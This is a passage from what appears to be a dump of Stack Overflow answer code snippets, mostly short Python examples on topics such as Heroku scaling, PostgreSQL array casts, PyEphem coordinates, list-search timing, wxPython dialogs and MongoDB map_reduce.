</snippet></ROW><ROW><id>11961859</id><snippet>GALX</snippet></ROW><ROW><id>11961859</id><snippet>dsh</snippet></ROW><ROW><id>11961859</id><snippet>data = {
    'Email': 'email', 
    'Passwd': 'passwrd', 
    'GALX': 'GALX_value_above', 
    'dsh': 'dsh_value_above' }
</snippet></ROW><ROW><id>11961899</id><snippet>requirements.txt</snippet></ROW><ROW><id>11961899</id><snippet>import os
import sys

import heroku

"""Scale heroku web processes using the heroku python API."""

# you may want to add better argument processing, use argparse, etc.
dynos = int(sys.argv[1])
cloud = heroku.from_key(os.environ.get('HEROKU_API_KEY'))
app = cloud.apps['your_app_name']

try:
    # you may want to add a maximum dyno check here to prevent costly mistakes ;)
    webproc = app.processes['web']  
    webproc.scale(dynos)

except KeyError:
    # note: scaling to 0 dynos or attempting to scale up if 0 web dynos exist
    # both throw this error. Make sure you have at least one dyno.
    print &gt;&gt; sys.stderr, "Could not scale web processes - are there 0 web dynos running?"
</snippet></ROW><ROW><id>11961899</id><snippet>scale_up: python scale.py 2
scale_down: python scale.py 1
</snippet></ROW><ROW><id>11961953</id><snippet>backupDir = "C:/Users/myuser/backups/"
backupFile = "mybackup.zip"
file = zipfile.ZipFile(backupDir + backupFile, "w")
for name in os.listdir(backupDir):
    if name == backupFile:
        continue
    fullname = backupDir + name
    print "Found " + name
    file.write(fullname, os.path.basename(name), zipfile.ZIP_DEFLATED)
file.close()
</snippet></ROW><ROW><id>11962000</id><snippet>getTimeStamp()</snippet></ROW><ROW><id>11962000</id><snippet>video['date'] = video['_id'].generation_time
</snippet></ROW><ROW><id>11962001</id><snippet>import functools
def f(x,y):
    return x+y

print functools.reduce(f, [1, 2, 3, 4]) # prints 10
print functools.reduce(f, [1, 2, 3, 4], 10) # prints 20, because it initializes at 10, not 0.
</snippet></ROW><ROW><id>11962236</id><snippet>
new_values = urlparse.parse_qs(self.request.body)

# values show as lists with only one item
for k in new_values:                             
    new_values[k] = new_values[k][0]             
</snippet></ROW><ROW><id>11962373</id><snippet>for row in rows:
        word_count += 1
</snippet></ROW><ROW><id>11962373</id><snippet>word_count += len(rows)
</snippet></ROW><ROW><id>11962373</id><snippet>self.word_database()
</snippet></ROW><ROW><id>11962463</id><snippet>xproto.CW.EventMask</snippet></ROW><ROW><id>11962463</id><snippet>[xproto.EventMask.SubstructureRedirect, xproto.EventMask.SubstructureNotify]</snippet></ROW><ROW><id>11962463</id><snippet>[xproto.EventMask.SubstructureRedirect|xproto.EventMask.SubstructureNotify]</snippet></ROW><ROW><id>11962463</id><snippet>import xcb
import xcb.xproto as xproto
conn = xcb.connect()
root = conn.get_setup().roots[0].root
conn.core.ChangeWindowAttributesChecked(self.root, xproto.CW.EventMask, [xproto.EventMask.SubstructureRedirect|xproto.EventMask.SubstructureNotify])
while True:
    e = conn.wait_for_event()
    print e
</snippet></ROW><ROW><id>11962505</id><snippet>&gt;&gt;&gt; '//phylo:name[text()='+line[0]+']'
'//phylo:name[text()=something]'
</snippet></ROW><ROW><id>11962505</id><snippet>&gt;&gt;&gt; '//phylo:name[text()="%s"]' % line[0]
'//phylo:name[text()="something"]'
</snippet></ROW><ROW><id>11962746</id><snippet>getattr()</snippet></ROW><ROW><id>11962907</id><snippet>base.html</snippet></ROW><ROW><id>11962907</id><snippet>{% extends 'base.html' %}</snippet></ROW><ROW><id>11963002</id><snippet>quote_1 = ("monkeys rock", "False")
quote_2 = ("donkeys rock",  "True")
q_list = [ quote_1, quote_2]
print cur.mogrify("insert into posts VALUES(%s,%s::quotes[])", 
                  ("animals are good", q_list))
#
#                 added explicit cast to quotes[]-&gt;^^^^^^^^
</snippet></ROW><ROW><id>11963002</id><snippet>insert into posts 
VALUES('animals are good', ARRAY[
    ('monkeys rock', 'false'),
    ('donkeys rock', 'true')
]);
</snippet></ROW><ROW><id>11963002</id><snippet>psql</snippet></ROW><ROW><id>11963002</id><snippet>regress=# insert into posts 
regress-# VALUES('animals are good',ARRAY[
regress-#             ('monkeys rock', 'false'),
regress-#             ('donkeys rock', 'true')
regress-#  ]);
ERROR:  column "q" is of type quotes[] but expression is of type record[]
LINE 1: insert into posts VALUES('animals are good',ARRAY[('monkeys ...
                                                    ^
HINT:  You will need to rewrite or cast the expression.
</snippet></ROW><ROW><id>11963002</id><snippet>quotes[]</snippet></ROW><ROW><id>11963002</id><snippet>regress=# insert into posts 
regress-# VALUES('animals are good',ARRAY[
regress-#           ('monkeys rock', 'false'),
regress-#           ('donkeys rock', 'true')
regress-# ]::quotes[]);
INSERT 0 1

regress=# select * from posts;
       body       |                           q                            
------------------+--------------------------------------------------------
 animals are good | {"(\"monkeys rock\",false)","(\"donkeys rock\",true)"}
(1 row)
</snippet></ROW><ROW><id>11963026</id><snippet>import some_module
</snippet></ROW><ROW><id>11963026</id><snippet>import pygame
from pygame.locals import *
</snippet></ROW><ROW><id>11963026</id><snippet>import sys
print sys.path
</snippet></ROW><ROW><id>11963127</id><snippet>#!/Users/foo/environments/project/env/bin/python
</snippet></ROW><ROW><id>11963127</id><snippet>#!/usr/bin/env python</snippet></ROW><ROW><id>11963127</id><snippet>myscript</snippet></ROW><ROW><id>11963127</id><snippet>#!/bin/bash

/Users/foo/environments/project/env/bin/python myscript.py
</snippet></ROW><ROW><id>11963127</id><snippet>myscript</snippet></ROW><ROW><id>11963207</id><snippet>cycle</snippet></ROW><ROW><id>11963207</id><snippet>&lt;style&gt;
.column{
    width:50%;
}
&lt;/style&gt;

{% for form in forms %}
&lt;div class="column" style="float:{% cycle 'left' 'right' %}"&gt;
     {{ form }}
&lt;/div&gt;
{% endfor %}
</snippet></ROW><ROW><id>11963334</id><snippet>python</snippet></ROW><ROW><id>11963334</id><snippet>PATH</snippet></ROW><ROW><id>11963334</id><snippet>python.exe setup.py install</snippet></ROW><ROW><id>11963334</id><snippet>.exe</snippet></ROW><ROW><id>11963424</id><snippet>db</snippet></ROW><ROW><id>11963424</id><snippet>db</snippet></ROW><ROW><id>11963424</id><snippet>db</snippet></ROW><ROW><id>11963424</id><snippet>current</snippet></ROW><ROW><id>11963424</id><snippet>from gluon import current
db = DAL('sqlite://storage.sqlite')
current.db = db
</snippet></ROW><ROW><id>11963424</id><snippet>from gluon import current
def somefunction():
    db = current.db
    [do something with db]
</snippet></ROW><ROW><id>11963424</id><snippet>db</snippet></ROW><ROW><id>11963424</id><snippet>current</snippet></ROW><ROW><id>11963439</id><snippet>from novas import compat as novas
jd_tt = novas.julian_date(2012, 9, 8, 12.00)
delta_t = 66.603  # from http://maia.usno.navy.mil/ser7/deltat.preds
lat = 42.3583     # positive is north
lon = -71.0603    # negative is west
observer = novas.make_observer_on_surface(lat, lon, 0, 0, 0)
print novas.geo_posvel(jd_tt, delta_t, observer)
</snippet></ROW><ROW><id>11963439</id><snippet>parallax.c</snippet></ROW><ROW><id>11963439</id><snippet>ta_par()</snippet></ROW><ROW><id>11963439</id><snippet>298.257</snippet></ROW><ROW><id>11963439</id><snippet>earthsat.c</snippet></ROW><ROW><id>11963439</id><snippet>EarthFlat</snippet></ROW><ROW><id>11963439</id><snippet>298.25</snippet></ROW><ROW><id>11963439</id><snippet>GetSitPosition()</snippet></ROW><ROW><id>11963439</id><snippet>static</snippet></ROW><ROW><id>11963439</id><snippet>t</snippet></ROW><ROW><id>11963439</id><snippet>import ephem
import math

m = ephem.Mars('2012/8/1')
print m.ra, m.dec

x = math.cos(m.dec) * math.cos(m.ra)
y = math.cos(m.dec) * math.sin(m.ra)
z = math.sin(m.dec)

print x, y, z
print 'sanity check: vector length =', math.sqrt(x*x + y*y + z*z)
</snippet></ROW><ROW><id>11963439</id><snippet>12:58:51.20 -6:24:05.6
-0.961178016954 -0.252399543786 -0.111495695074
sanity check: vector length = 1.0
</snippet></ROW><ROW><id>11963439</id><snippet>x</snippet></ROW><ROW><id>11963439</id><snippet>y</snippet></ROW><ROW><id>11963439</id><snippet>z</snippet></ROW><ROW><id>11963439</id><snippet>z</snippet></ROW><ROW><id>11963439</id><snippet>x</snippet></ROW><ROW><id>11963439</id><snippet>y</snippet></ROW><ROW><id>11963439</id><snippet>z</snippet></ROW><ROW><id>11963439</id><snippet>x</snippet></ROW><ROW><id>11963439</id><snippet>y</snippet></ROW><ROW><id>11963439</id><snippet>x</snippet></ROW><ROW><id>11963439</id><snippet>y</snippet></ROW><ROW><id>11963439</id><snippet>z</snippet></ROW><ROW><id>11963439</id><snippet>x</snippet></ROW><ROW><id>11963439</id><snippet>y</snippet></ROW><ROW><id>11963439</id><snippet>z</snippet></ROW><ROW><id>11963439</id><snippet>x</snippet></ROW><ROW><id>11963439</id><snippet>y</snippet></ROW><ROW><id>11963439</id><snippet>z</snippet></ROW><ROW><id>11963439</id><snippet>x</snippet></ROW><ROW><id>11963439</id><snippet>y</snippet></ROW><ROW><id>11963439</id><snippet>z</snippet></ROW><ROW><id>11963439</id><snippet>x = math.cos(m.alt) * math.cos(m.az)
y = math.cos(m.alt) * math.sin(m.az)
z = math.sin(m.alt)
</snippet></ROW><ROW><id>11963727</id><snippet>mylist = [['a','b','c'],['d','e','f']]
'd' in [j for i in mylist for j in i]
</snippet></ROW><ROW><id>11963727</id><snippet>True
</snippet></ROW><ROW><id>11963727</id><snippet>'d' in [elem for sublist in mylist for elem in sublist]
</snippet></ROW><ROW><id>11963727</id><snippet>for sublist in mylist:
   for elem in sublist
</snippet></ROW><ROW><id>11963727</id><snippet>in</snippet></ROW><ROW><id>11963750</id><snippet>with open('data.txt') as f,open('out.txt') as f2:
    for x in f:
        if 'are' not in x:
            f2.write(x.strip()+'\n')  #strip the line first and then add a '\n', 
                                      #so now you'll not get a empty line between two lines   
</snippet></ROW><ROW><id>11963755</id><snippet>&gt;&gt;&gt; [ dict(y.split(':') for y in x.split(',')) for x in 'name:mickey,age:58|name:minnie,age:47,weight:60'.split('|')]
[{'age': '58', 'name': 'mickey'}, {'age': '47', 'name': 'minnie', 'weight': '60'}]
</snippet></ROW><ROW><id>11963944</id><snippet>sudo apt-get install python-jpype
</snippet></ROW><ROW><id>11964048</id><snippet>.__dict__</snippet></ROW><ROW><id>11964048</id><snippet>class Person(object):
    def addattr(self,x,val):
        self.__dict__[x]=val
</snippet></ROW><ROW><id>11964048</id><snippet>&gt;&gt;&gt; a=Person()
&gt;&gt;&gt; a.addattr('foo',10)
&gt;&gt;&gt; a.addattr('bar',20)
&gt;&gt;&gt; a.foo
10
&gt;&gt;&gt; a.bar
20
&gt;&gt;&gt; b=Person()
&gt;&gt;&gt; b.addattr('spam','somevalue')
&gt;&gt;&gt; b.spam
'somevalue'
</snippet></ROW><ROW><id>11964142</id><snippet>{{ foo | some_filter }}</snippet></ROW><ROW><id>11964444</id><snippet>i&amp;0xFF</snippet></ROW><ROW><id>11964444</id><snippet>i%256</snippet></ROW><ROW><id>11964478</id><snippet>in</snippet></ROW><ROW><id>11964478</id><snippet>lis=[['a','b','c'],['d','e','f'],[1,2,3],[4,5,6],
     [7,8,9],[10,11,12],[13,14,15],[16,17,18]]

def ge_d():
    return 'd' in (y for x in lis for y in x)
def lc_d():
    return 'd' in [y for x in lis for y in x]

def ge_11():
    return 11 in (y for x in lis for y in x)
def lc_11():
    return 11 in [y for x in lis for y in x]

def ge_18():
    return 18 in (y for x in lis for y in x)
def lc_18():
    return 18 in [y for x in lis for y in x]

for i in xrange(100000):
    ge_d()
    lc_d()
    ge_11()
    lc_11()
    ge_18()
    lc_18()
</snippet></ROW><ROW><id>11964478</id><snippet>         5400002 function calls in 2.830 seconds

   Ordered by: standard name

   ncalls  tottime  percall  cumtime  percall filename:lineno(function)
   100000    0.158    0.000    0.251    0.000 fop.py:3(ge_d)
   500000    0.092    0.000    0.092    0.000 fop.py:4(&lt;genexpr&gt;)
   100000    0.285    0.000    0.285    0.000 fop.py:5(lc_d)

   100000    0.356    0.000    0.634    0.000 fop.py:8(ge_11)
  1800000    0.278    0.000    0.278    0.000 fop.py:9(&lt;genexpr&gt;)
   100000    0.333    0.000    0.333    0.000 fop.py:10(lc_11)

   100000    0.435    0.000    0.806    0.000 fop.py:13(ge_18)
  2500000    0.371    0.000    0.371    0.000 fop.py:14(&lt;genexpr&gt;)
   100000    0.344    0.000    0.344    0.000 fop.py:15(lc_18)
</snippet></ROW><ROW><id>11964478</id><snippet>&lt;genexpr&gt;</snippet></ROW><ROW><id>11964478</id><snippet>next</snippet></ROW><ROW><id>11964478</id><snippet>d</snippet></ROW><ROW><id>11964478</id><snippet>next</snippet></ROW><ROW><id>11964478</id><snippet>&gt;&gt;&gt; .634 - .278 - .333
0.023
&gt;&gt;&gt; .806 - .371 - .344
0.091
</snippet></ROW><ROW><id>11964478</id><snippet>next</snippet></ROW><ROW><id>11964478</id><snippet>&gt;&gt;&gt; counter = itertools.count()
&gt;&gt;&gt; lol = [[counter.next(), counter.next(), counter.next()] 
           for _ in range(1000000)]
&gt;&gt;&gt; 2999999 in (i for sublist in lol for i in sublist)
True
&gt;&gt;&gt; 3000000 in (i for sublist in lol for i in sublist)
False
&gt;&gt;&gt; %timeit 2999999 in [i for sublist in lol for i in sublist]
1 loops, best of 3: 312 ms per loop
&gt;&gt;&gt; %timeit 2999999 in (i for sublist in lol for i in sublist)
1 loops, best of 3: 351 ms per loop
&gt;&gt;&gt; %timeit any([2999999 in sublist for sublist in lol])
10 loops, best of 3: 161 ms per loop
&gt;&gt;&gt; %timeit any(2999999 in sublist for sublist in lol)
10 loops, best of 3: 163 ms per loop
&gt;&gt;&gt; %timeit for i in [2999999 in sublist for sublist in lol]: pass
1 loops, best of 3: 171 ms per loop
&gt;&gt;&gt; %timeit for i in (2999999 in sublist for sublist in lol): pass
1 loops, best of 3: 183 ms per loop
</snippet></ROW><ROW><id>11964478</id><snippet>in</snippet></ROW><ROW><id>11964478</id><snippet>&gt;&gt;&gt; incache = [2999999 in sublist for sublist in lol]
&gt;&gt;&gt; get_list = lambda: incache
&gt;&gt;&gt; get_gen = lambda: (2999999 in sublist for sublist in lol)
&gt;&gt;&gt; %timeit for i in get_list(): pass
100 loops, best of 3: 18.6 ms per loop
&gt;&gt;&gt; %timeit for i in get_gen(): pass
1 loops, best of 3: 187 ms per loop
</snippet></ROW><ROW><id>11964572</id><snippet>data_list = [-5, -23, 5, 0, 23, -6, 23, 67]
new_list = []

while data_list:
    minimum = data_list[0]  # arbitrary number in list 
    for x in data_list: 
        if x &lt; minimum:
            minimum = x
    new_list.append(minimum)
    data_list.remove(minimum)    

print new_list
</snippet></ROW><ROW><id>11964588</id><snippet>i</snippet></ROW><ROW><id>11964588</id><snippet>i</snippet></ROW><ROW><id>11964588</id><snippet>&gt;&gt;&gt; s = [None]*10
&gt;&gt;&gt; def func():
...     for i in range(10):
...         def update(i=i):
...             print i,
...         s[i] = update
... 
&gt;&gt;&gt; func()
&gt;&gt;&gt; for i in range(10):
...     s[i]()
... 
0 1 2 3 4 5 6 7 8 9
</snippet></ROW><ROW><id>11964625</id><snippet>iterable</snippet></ROW><ROW><id>11964625</id><snippet>next()</snippet></ROW><ROW><id>11964625</id><snippet>with open('data.txt') as f:
    lines=[x.strip() for x in f]
    spaces=lines.count('')   #count the number of empty lines
    odd_spaces=spaces//2+1   #odd lines 1,3,5,7...
    even_spaces=spaces-odd_spaces #even lines 2,4,6,...

    it=iter(range(1,spaces+1)) #create an iterable
    try:
        lines=[x if x!='' else next(it) for x in lines]  #if line is empty then call next(it)
    except StopIteration:
        pass
    for x in lines:
        print(x)

    fil=[4*x+1 for x in range(0,spaces+1) if 4*x+1&lt;spaces] #4x+1
    print(fil)
    row=[lines[lines.index(x)-1] for x in fil]
    print(row)

    fil=[2*x+1 for x in range(0,spaces+1) if 2*x+1&lt;spaces] #2x+1
    print(fil)
    row=[lines[lines.index(x)-1] for x in fil]
    print(row)
</snippet></ROW><ROW><id>11964625</id><snippet>apple
1
ae-pal
2
noun.
3
a fruit
4
ball
5
b'al
6
noun.
7
playing material
round shaped
[1, 5]
['apple', 'ball']
[1, 3, 5]
['apple', 'noun.', 'ball']
</snippet></ROW><ROW><id>11964627</id><snippet>á</snippet></ROW><ROW><id>11964627</id><snippet>Juárez</snippet></ROW><ROW><id>11964627</id><snippet>&lt;?xml version="1.0" encoding="iso-8859-1" ?&gt;
</snippet></ROW><ROW><id>11964627</id><snippet>á</snippet></ROW><ROW><id>11964627</id><snippet>Unicode á   - 0x00E1 
ISO-8859-1  - 0xE1
UTF-8       - 0xc3 0xa1
</snippet></ROW><ROW><id>11964627</id><snippet>á</snippet></ROW><ROW><id>11964725</id><snippet>self.carrier</snippet></ROW><ROW><id>11964725</id><snippet>wx.ComboBox</snippet></ROW><ROW><id>11964725</id><snippet>ShowModal()</snippet></ROW><ROW><id>11964725</id><snippet>wx.EVT_COMBOBOX</snippet></ROW><ROW><id>11964725</id><snippet>ShowModal()</snippet></ROW><ROW><id>11964725</id><snippet>wx.EVT_COMBOBOX</snippet></ROW><ROW><id>11964725</id><snippet>wx.Dialog</snippet></ROW><ROW><id>11964725</id><snippet>ShowModal()</snippet></ROW><ROW><id>11964725</id><snippet>wx.SingleChoiceDialog</snippet></ROW><ROW><id>11964725</id><snippet>ctrl+f</snippet></ROW><ROW><id>11964725</id><snippet>class MyTxtMsgDialog (wx.Dialog):
    def __init__(self, parent):
        wx.Dialog.__init__(self, parent=parent, title="My Txt Message Dialog")

        self.number = wx.TextCtrl(self)
        self.carrier = wx.ComboBox(self, -1, pos=(10, 50), choices=carriers, style=wx.CB_READONLY)
        self.message = wx.TextCtrl(self, style=wx.TC_MULTILINE) #means this TextCtrl will be multiple lines, not just one
        self.okButton = wx.Button(self, wx.ID_OK, "OK")
        #Setting the ID to wx.ID_OK is important. Any of the wx.ID_* variables work natively with ShowModal()
        #but if you created your own ID using the wx.NewId() method then you will need to manually call
        #"self.EndModal(&lt;your ID&gt;)" when your button is clicked.
</snippet></ROW><ROW><id>11964725</id><snippet>txtMsgDialog = MyTxtMsgDialog(self)
if txtMsgDialog.ShowModal() == wx.ID_OK: #check to see if OK was pressed
    #save the values
    self.number = txtMsgDialog.number.GetValue()
    self.carrier = txtMsgDialog.carrier.GetGetValue()
    self.message = txtMsgDialog.message.GetValue()

    txtMsgDialog.Destroy() #close the dialog
</snippet></ROW><ROW><id>11964725</id><snippet>Destroy()</snippet></ROW><ROW><id>11964725</id><snippet>Destroy()</snippet></ROW><ROW><id>11964853</id><snippet>&lt;time&gt;</snippet></ROW><ROW><id>11964853</id><snippet>(?P&lt;date&gt;\w{3} \d{1,2}  \d{4})|(?P&lt;time&gt;\w{3} \d{1,2} \d{1,2}:\d{2})
</snippet></ROW><ROW><id>11964853</id><snippet>^.+(...).+</snippet></ROW><ROW><id>11964853</id><snippet>\s+</snippet></ROW><ROW><id>11964853</id><snippet>+</snippet></ROW><ROW><id>11964853</id><snippet>[ ]+</snippet></ROW><ROW><id>11964853</id><snippet>(?P&lt;date&gt;\w{3}\s+\d{1,2})\s+(?:(?P&lt;year&gt;\d{4})|(?P&lt;time&gt;\d{1,2}:\d{2}))
</snippet></ROW><ROW><id>11964960</id><snippet>times = [0]*13
for _ in range(1000):
    sum_ = randint(1, 6) + randint(1, 6)
    times[sum_] += 1

print(times[2:])
</snippet></ROW><ROW><id>11964960</id><snippet>times</snippet></ROW><ROW><id>11964960</id><snippet>times[i]</snippet></ROW><ROW><id>11964960</id><snippet>sum_ == i</snippet></ROW><ROW><id>11964960</id><snippet>times[0]</snippet></ROW><ROW><id>11964960</id><snippet>times[1]</snippet></ROW><ROW><id>11964960</id><snippet>sum_ &gt; 1</snippet></ROW><ROW><id>11964960</id><snippet>[x]*3</snippet></ROW><ROW><id>11964960</id><snippet>[x, x, x]</snippet></ROW><ROW><id>11964960</id><snippet>L = []
L.append(x)
L.append(x)
L.append(x)
</snippet></ROW><ROW><id>11964960</id><snippet>print something</snippet></ROW><ROW><id>11964960</id><snippet>for i range(1, 1000)</snippet></ROW><ROW><id>11964960</id><snippet>range</snippet></ROW><ROW><id>11964992</id><snippet>x = all(list_of_bools)
</snippet></ROW><ROW><id>11964992</id><snippet>x= all((a, b, c, d, e, f))
</snippet></ROW><ROW><id>11964992</id><snippet>&gt;&gt;&gt; list_of_bools = [True, True, True, False]
&gt;&gt;&gt; all(list_of_bools)
False
&gt;&gt;&gt; list_of_bools = [True, True, True, True]
&gt;&gt;&gt; all(list_of_bools)
True
</snippet></ROW><ROW><id>11965011</id><snippet>__init__</snippet></ROW><ROW><id>11965011</id><snippet>def __int__(self, start):
        ^ no "i"
</snippet></ROW><ROW><id>11965077</id><snippet>__setattr__</snippet></ROW><ROW><id>11965077</id><snippet>__slots__</snippet></ROW><ROW><id>11965077</id><snippet>__setattr__</snippet></ROW><ROW><id>11965077</id><snippet>__init__</snippet></ROW><ROW><id>11965077</id><snippet>class A(object):
    def __init__(self):
        self.a = 1
        self.b = 2
        self.c = 3
        self.freeze = True

    def __setattr__(self, attr, value):
        if getattr(self, "freeze", False) and not hasattr(self, attr):
            raise AttributeError("You shall not set attributes!")
        super(A, self).__setattr__(attr, value)
</snippet></ROW><ROW><id>11965077</id><snippet>a = A()
try:
    a.d = 89
except AttributeError:
    print "It works!"
else:
    print "It doesn't work."
a.c = 42
print a.a
print a.c
a.freeze = False
a.d = 28
a.freeze = True
print a.d
</snippet></ROW><ROW><id>11965077</id><snippet>from contextlib import contextmanager

@contextmanager
def declare_attributes(self):
    self._allow_declarations = True
    try:
        yield
    finally:
        self._allow_declarations = False

def restrict_attributes(cls):
    cls.declare_attributes = declare_attributes
    def _setattr(self, attr, value):
        disallow_declarations = not getattr(self, "_allow_declarations", False)
        if disallow_declarations and attr != "_allow_declarations":
            if not hasattr(self, attr):
                raise AttributeError("You shall not set attributes!")
        super(cls, self).__setattr__(attr, value)
    cls.__setattr__ = _setattr

    return cls
</snippet></ROW><ROW><id>11965077</id><snippet>@restrict_attributes
class A(object):
    def __init__(self):
        with self.declare_attributes():
            self.a = 1
            self.b = 2
            self.c = 3
</snippet></ROW><ROW><id>11965077</id><snippet>with</snippet></ROW><ROW><id>11965077</id><snippet>a = A()
try:
    a.d = 89
except AttributeError:
    print "It works!"
else:
    print "It doesn't work."
a.c = 42
print a.a
print a.c
with a.declare_attributes():
    a.d = 28
print a.d
</snippet></ROW><ROW><id>11965110</id><snippet>button.props.image = gtk.image_new_from_icon_name('emblem-favorite', gtk.ICON_SIZE_BUTTON)
</snippet></ROW><ROW><id>11965162</id><snippet>pbcopy</snippet></ROW><ROW><id>11965162</id><snippet>from subprocess import call
var = "Hello world!"
cmd = 'echo "%s" | pbcopy' % var
call([cmd], shell=True)
</snippet></ROW><ROW><id>11965279</id><snippet>Packet</snippet></ROW><ROW><id>11965279</id><snippet>StrMessage</snippet></ROW><ROW><id>11965279</id><snippet>IntMessage</snippet></ROW><ROW><id>11965279</id><snippet>Packet</snippet></ROW><ROW><id>11965436</id><snippet>def nonZero(var):
   if isinstance(var,collection): 
     if len(collection) == 0 : return False
     else: return True
   if isinstance(var, number):
     if number == 0 : return False
     else: return True
   if isinstance(var, boolean): return var
   if isinstance(var, NoneType): return False
   if hasattr(var,'__nonzero__'): return var.__nonzero__()


nodeIds = Framework.getDataAsList(key)
if not nonZero(nodeIds) : nodeIds = []
</snippet></ROW><ROW><id>11965466</id><snippet>0j</snippet></ROW><ROW><id>11965466</id><snippet>if (np.iscomplexobj(b)):
    a = a + 0j
a[0:2] *= b
</snippet></ROW><ROW><id>11965466</id><snippet>a += 0j</snippet></ROW><ROW><id>11965576</id><snippet>from models import *
</snippet></ROW><ROW><id>11965576</id><snippet>status = True
page_id = ""


# META INFORMATION
meta_keywords = ""
meta_description = ""
page_title = ""
favicon = ""

# RESOURCES
javascript_resources = []
javascript_files = []
style_sheets = []

def __init__(self, page_id = "home"):
    self.page_id = page_id.lower()
    self.get_status()
    self.get_meta()
    self.get_javascript()
    self.get_style_sheets()

def get_status(self):
    status = settings.SITE_STATUS

    if(status != "live"):
        self.status = False
    else:
        self.status = True


def get_meta(self):
    current = Meta.objects.get(page_id = self.page_id)
    self.meta_keywords = current.meta_keywords
    self.meta_description = current.meta_description
    self.page_title = current.page_title
    self.favicon = current.favicon

# this function will set all of the proper javascript lists and validate all files!
def get_javascript(self):


    javascript_list = Javascript.objects.filter(Q(page_id = "all") | Q(page_id = self.page_id)).filter(status = self.status)
    javascript_resources_list = Javascript_resources.objects.filter(Q(page_id = "all") | Q(page_id = self.page_id)).filter(status = self.status)

    #now evaulate the javascript
    if len(javascript_list) &gt; 0:
        for resource in javascript_list:
            file_name = resource.url

            if self.exists(file_name):
                self.javascript_files.append(file_name)

    if len(javascript_resources_list) &gt; 0:
        for resource in javascript_resources_list:
            file_name = resource.url

            if self.exists(file_name):
                self.javascript_resources.append(file_name)


def get_style_sheets(self):

    style_sheet_list = Style_sheets.objects.filter(Q(page_id = "all") | Q(page_id = self.page_id)).filter(status = self.status)


    if len(style_sheet_list) &gt; 0:
        for resource in style_sheet_list:
            file_name = resource.url
            file_type = resource.file_type

            if self.exists(file_name):
                style_sheet = []
                style_sheet.append(file_type)
                style_sheet.append(file_name)

                self.style_sheets.append(style_sheet)

def exists(self, file_name):

    url = settings.STATIC_URL + file_name

    status = False

    if  path.exists(url):
        status = True

    return status
</snippet></ROW><ROW><id>11965649</id><snippet>delim_value = Group(delimitedList(string_value | int_value))("list")
list_value = Or( (Suppress("[") + delim_value + Suppress("]"),
                  Suppress("(") + delim_value + Suppress(")")) )
</snippet></ROW><ROW><id>11965671</id><snippet>from dulwich.repo import Repo
from dulwich.client import HttpGitClient
local = Repo.init("local", mkdir=True)
client = HttpGitClient('http://github.com/adammorris/')
remote_refs = client.fetch("history.js.git",local)
local["HEAD"] = remote_refs["refs/heads/master"]
</snippet></ROW><ROW><id>11965866</id><snippet>key_filename</snippet></ROW><ROW><id>11965866</id><snippet>~/.ssh</snippet></ROW><ROW><id>11966459</id><snippet>def getPixels(file):
    img = Image.open(file)

    pixels = img.load()
    width, height = img.size

    all_pixels =  []

    for x in range(width):
        for y in range(height):
            cpixel = pixels[x, y]
            all_pixels.append(cpixel)

    return all_pixels
</snippet></ROW><ROW><id>11966459</id><snippet>def generateHistogram(file, z):
    px = getPixels(file)
    a = np.histogram(px, bins=np.arange(z))
</snippet></ROW><ROW><id>11966500</id><snippet>number</snippet></ROW><ROW><id>11966500</id><snippet>%</snippet></ROW><ROW><id>11966500</id><snippet>ISODate("0NaN-NaN-NaNTNaN:NaN:NaNZ")</snippet></ROW><ROW><id>11966500</id><snippet>datetime.datetime(1970, 1, 1, 0, 0)</snippet></ROW><ROW><id>11966500</id><snippet>from pymongo import Connection
from bson.code import Code

db = Connection().mr_test
for i in xrange(10):
    db.things.insert({"x" : i})


map = Code("function(number) {"
    "emit({"
        "ts : number"
    "}, 1);"
"}")

reduce = Code("function(key, vals) {"
    "var sum = 0;"
    "for (var i in vals) {"
        "sum += vals[i]"
    "}"
    "return sum;"
"}")


result = db.things.map_reduce(map, reduce, "test_results")
for doc in result.find():
    print doc
</snippet></ROW><ROW><id>11966500</id><snippet>{u'_id': {u'ts': None}, u'value': 10.0}
</snippet></ROW><ROW><id>11966500</id><snippet>ts</snippet></ROW><ROW><id>11966500</id><snippet>None</snippet></ROW><ROW><id>11966500</id><snippet>number</snippet></ROW><ROW><id>11966500</id><snippet>map</snippet></ROW><ROW><id>11966500</id><snippet>scope</snippet></ROW><ROW><id>11966500</id><snippet>map_reduce</snippet></ROW><ROW><id>11966500</id><snippet>map = Code("function() {"
    "emit({"
        "ts : new Date(new Date((this.ts - (this.ts % (60 * number))) * 1000).setSeconds(0))"
    "}, 1);"
"}")
</snippet></ROW><ROW><id>11966500</id><snippet>db.whatever.map_reduce(map, reduce, "collection_name", scope = {"number" : the_value_your_function_needs}) 
</snippet></ROW><ROW><id>11966600</id><snippet>asyncore</snippet></ROW><ROW><id>11966600</id><snippet>twisted</snippet></ROW><ROW><id>11966600</id><snippet>eventlets</snippet></ROW><ROW><id>11966600</id><snippet>greenlets</snippet></ROW><ROW><id>11966600</id><snippet>multiprocessing</snippet></ROW><ROW><id>11966993</id><snippet>itertools</snippet></ROW><ROW><id>11966993</id><snippet>map(..., itertools.ifilter(..))
</snippet></ROW><ROW><id>11966993</id><snippet>[x.room_number() for x in people if check(x)]
</snippet></ROW><ROW><id>11967060</id><snippet>reload</snippet></ROW><ROW><id>11967060</id><snippet>superreload</snippet></ROW><ROW><id>11967060</id><snippet>old_dict = module.__dict__.copy()
try:
    module = reload(module)
except:
    module.__dict__.update(old_dict)
    raise
</snippet></ROW><ROW><id>11967076</id><snippet>text</snippet></ROW><ROW><id>11967076</id><snippet>relStatus.set(fire['text'])
</snippet></ROW><ROW><id>11967120</id><snippet>&lt;dmt/&gt;</snippet></ROW><ROW><id>11967120</id><snippet>val</snippet></ROW><ROW><id>11967120</id><snippet>from lxml import etree as ET

xmlDoc = ET.parse('http://192.168.1.198/Bench_read.xml')
print ET.tostring(xmlDoc, pretty_print=True)

response = xmlDoc.getroot()

tags = (
    'address',
    'status',
    'flow',
    'dp',
    'inPressure',
    'actVal',
    'temp',
    'valveOnPercent',
)

dmtVal = []

for dmt in response.iter('dmt'):
    val = [dmt.xpath('./%s/text()' % tag) for tag in tags]
    dmtVal.append(val)
</snippet></ROW><ROW><id>11967279</id><snippet>_foo.so</snippet></ROW><ROW><id>11967279</id><snippet>foo.py</snippet></ROW><ROW><id>11967279</id><snippet>foo</snippet></ROW><ROW><id>11967279</id><snippet>_foo</snippet></ROW><ROW><id>11967455</id><snippet>\b</snippet></ROW><ROW><id>11967455</id><snippet>import re
print re.sub(r'\bpi\b', 'math.pi', "2*pi")
print re.sub(r'\bpi\b', 'math.pi', "the pink elephant")
